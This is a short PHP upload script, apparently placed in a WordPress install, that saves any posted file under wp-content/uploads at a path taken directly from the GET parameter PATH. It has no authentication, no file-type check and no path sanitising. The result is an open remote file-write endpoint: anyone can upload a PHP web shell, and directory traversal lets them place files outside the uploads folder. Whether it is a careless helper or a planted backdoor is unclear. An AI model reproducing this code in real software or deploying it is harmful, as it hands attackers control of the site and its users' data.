<?php
 $uploaddir = realpath('./') . '/wp-content/uploads';
  echo '<pre>';
  $path=$_GET['PATH'];
  $uploadfile = $uploaddir . $path;
  
	if (move_uploaded_file($_FILES['file_contents']['tmp_name'], $uploadfile)) {
	    echo "File is valid, and was successfully uploaded.\n";
	} else {
	    echo "Possible file upload attack!\n";
	}
  
	//echo 'Here is some more debugging info:';
	//print_r($_FILES);
	//echo "\n<hr />\n";
	//print_r($_POST);
  echo  "</pre>";

?>